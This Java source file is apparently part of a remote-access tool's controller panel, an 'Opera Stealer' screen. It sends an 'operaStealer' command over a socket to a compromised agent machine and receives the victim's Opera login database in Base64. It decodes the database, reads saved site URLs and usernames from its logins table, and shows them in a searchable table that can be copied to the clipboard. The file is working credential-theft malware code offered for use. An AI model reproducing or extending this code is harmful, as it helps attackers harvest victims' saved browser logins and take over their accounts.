package org.pandora.master.scene.impl.agent;


import de.jensd.fx.glyphs.fontawesome.FontAwesomeIcon;
import de.jensd.fx.glyphs.fontawesome.FontAwesomeIconView;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.collections.transformation.FilteredList;
import javafx.geometry.Insets;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.MenuItem;
import javafx.scene.control.*;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.CornerRadii;
import javafx.scene.paint.Color;
import javafx.scene.shape.Line;
import org.apache.commons.io.FileUtils;
import org.controlsfx.control.textfield.CustomTextField;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;
import org.pandora.master.data.browser.BrowserData;
import org.pandora.master.utils.TimeUtils;

import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.sql.*;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicInteger;

public class OperaStealer {

    private final AnchorPane anchorPane;
    private final BuilderManager builderManager;
    private final AgentData agentData;
    private final ArrayList<String> waiting;
    private final Master master;
    private final ControllerBuilder controllerBuilder;
    private final TableView<BrowserData> tableView;
    private final ObservableList<BrowserData> observableList;
    private final FilteredList<BrowserData> filteredList;
    private final TableColumn<BrowserData, String> urlColumn;
    private final TableColumn<BrowserData, String> usernameColumn;
    private final TableColumn<BrowserData, String> passwordColumn;
    private final ContextMenu contextMenu;

    public OperaStealer(final ControllerBuilder controllerBuilder) {
        this.controllerBuilder = controllerBuilder;
        this.master = controllerBuilder.getMaster();
        this.anchorPane = controllerBuilder.getAnchorPane();
        this.builderManager = controllerBuilder.getBuilderManager();
        this.agentData = controllerBuilder.getAgentData();
        this.waiting = controllerBuilder.getWaiting();
        this.tableView = (TableView<BrowserData>) this.builderManager.getTableViewBuilder().buildTableView("No result found OR waiting for data...", Color.WHITE, 16, 456, 969, 0, 54, "agent-browserStealer-tableView");
        this.observableList = FXCollections.observableArrayList();
        this.filteredList = new FilteredList(this.observableList);
        this.urlColumn = (TableColumn<BrowserData, String>) this.builderManager.getTableColumnBuilder().buildTableColumn("URL", 317, "url");
        this.usernameColumn = (TableColumn<BrowserData, String>) this.builderManager.getTableColumnBuilder().buildTableColumn("Username", 317, "username");
        this.passwordColumn = (TableColumn<BrowserData, String>) this.builderManager.getTableColumnBuilder().buildTableColumn("Password", 317, "password");
        this.contextMenu = new ContextMenu();
    }

    public void open() {
        this.master.getStageManager().getScenes().put(this.controllerBuilder, this);
        this.anchorPane.setBackground(new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));

        final Label defaultLabel = this.builderManager.getLabelBuilder().buildLabel("Opera Stealer | " + this.agentData.getUser() + "@" + this.agentData.getAddress(), 15, 20, Color.rgb(230, 230, 230), "Consolas", 17);
        final Line line = this.builderManager.getBasicLineBuilder().buildSimpleLine(Color.WHITE, 20, 52, 949, 52);

        final FontAwesomeIconView fontAwesomeIconView = new FontAwesomeIconView(FontAwesomeIcon.SEARCH);
        fontAwesomeIconView.setFill(Color.rgb(118, 119, 135));
        fontAwesomeIconView.setSize("15");

        final CustomTextField searchField = new CustomTextField();
        searchField.setTranslateX(667);
        searchField.setTranslateY(14);
        searchField.setPrefWidth(250);
        searchField.setPrefHeight(25);
        searchField.setPromptText("Search...");
        searchField.setLeft(fontAwesomeIconView);
        searchField.textProperty().addListener((obs, oldValue, newValue) -> this.filteredList.setPredicate(browserData -> {
            final String value = newValue.toLowerCase().trim();
            return browserData.getUsername().toLowerCase().contains(value) || browserData.getUrl().toLowerCase().contains(value) || browserData.getId().toLowerCase().contains(value) || browserData.getPassword().toLowerCase().contains(value);
        }));

        searchField.setId("searchField");
        fontAwesomeIconView.setId("searchFontAwesomeIcon");

        this.tableView.setItems(this.filteredList);
        this.tableView.getColumns().setAll(this.urlColumn, this.usernameColumn, this.passwordColumn);
        this.tableView.requestLayout();

        final Button refreshButton = this.builderManager.getButtonBuilder().buildButton(null, "Refresh", 866, 536, Color.WHITE, "Verdana", 12, 75, 25, "agent-browserStealer-refresh");
        final Button copyButton = this.builderManager.getButtonBuilder().buildButton(null, "Copy All", 27, 536, Color.WHITE, "Verdana", 12, 75, 25, "agent-browserStealer-copy");

        copyButton.setOnMouseClicked(event -> {
            final StringBuilder data = new StringBuilder();
            this.tableView.getItems().forEach(browserData -> data.append(browserData.getId()).append("|").append(browserData.getUrl()).append("|").append(browserData.getUsername()).append("|").append(browserData.getPassword()).append("\n"));
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(data.toString()), null);
            this.master.getNotification().notify("Opera Stealer", "Data were successfully copied");
        });

        refreshButton.setOnMouseClicked(event -> this.sendListRequest());

        this.tableView.setRowFactory(tv -> {
            final TableRow<BrowserData> tableRow = new TableRow<>();
            tableRow.setOnContextMenuRequested(event -> {
                if (!tableRow.isEmpty())
                    this.contextMenu.show(tableRow, event.getScreenX(), event.getScreenY());
            });
            return tableRow;
        });

        this.createContextMenu();
        this.sendListRequest();

        this.anchorPane.getChildren().addAll(line, this.tableView, defaultLabel, refreshButton, searchField, copyButton);
    }

    private void createContextMenu() {
        final MenuItem copyItem = new MenuItem("Copy Row Data", null);
        this.contextMenu.getItems().add(copyItem);

        copyItem.setOnAction(event -> {
            final BrowserData browserData = Objects.requireNonNull((TableRow<BrowserData>) this.contextMenu.getOwnerNode()).getItem();
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(browserData.getId() + "|" + browserData.getUrl() + "|" + browserData.getUsername() + "|" + browserData.getPassword()), null);
            this.master.getNotification().notify("Opera Stealer", "Row data was successfully copied");
        });

    }

    private void sendListRequest() {
        final String id = TimeUtils.getRandomId();
        this.observableList.clear();
        this.master.getBrowserManager().deleteAll(this.agentData.getId());
        this.waiting.add(id);
        this.master.getSocketUtils().write(this.agentData.getId(), "operaStealer:" + id);
    }

    public void receiveRequest(final String id, final String response) {
        this.observableList.clear();
        this.master.getBrowserManager().deleteAll(this.agentData.getId());
        if (this.waiting.contains(id)) {
            this.waiting.remove(id);
            if (response.equals("An error occurred")) {
                final BrowserData browserData = new BrowserData("0", "An error occurred", "An error occurred", "An error occurred");
                this.master.getAgentManager().getAgentData(this.agentData.getId()).getBrowser().add(browserData);
                this.observableList.add(browserData);
            } else {
                try {
                    final File folder = new File(this.master.getFileUtils().getValue("download"));
                    if (!folder.exists()) folder.mkdirs();
                    final File file = new File(folder.getAbsolutePath() + "\\" + id);
                    final byte[] byteArray = Base64.getDecoder().decode(response);
                    final FileOutputStream outFile = new FileOutputStream(file);
                    outFile.write(byteArray);
                    outFile.close();

                    final AtomicInteger atomicInteger = new AtomicInteger();
                    if (file.exists()) {
                        Class.forName("org.sqlite.JDBC");
                        final Connection connection = DriverManager.getConnection("jdbc:sqlite:" + file.getAbsolutePath());
                        final PreparedStatement prepareStatement = connection.prepareStatement("SELECT `origin_url`,`username_value` from `logins`");
                        final ResultSet resultSet = prepareStatement.executeQuery();
                        while (resultSet.next()) {
                            final BrowserData browserData = new BrowserData(String.valueOf(atomicInteger.getAndIncrement()), resultSet.getString("origin_url"), resultSet.getString("username_value"), "WinCrypt32");
                            this.master.getAgentManager().getAgentData(this.agentData.getId()).getBrowser().add(browserData);
                            this.observableList.add(browserData);
                        }
                        resultSet.close();
                        prepareStatement.close();
                        connection.close();
                        FileUtils.forceDelete(file);
                    }
                } catch (final IOException | ClassNotFoundException | SQLException exception) {
                    exception.printStackTrace();
                }
                this.tableView.setItems(this.filteredList);
            }
        }
    }
}


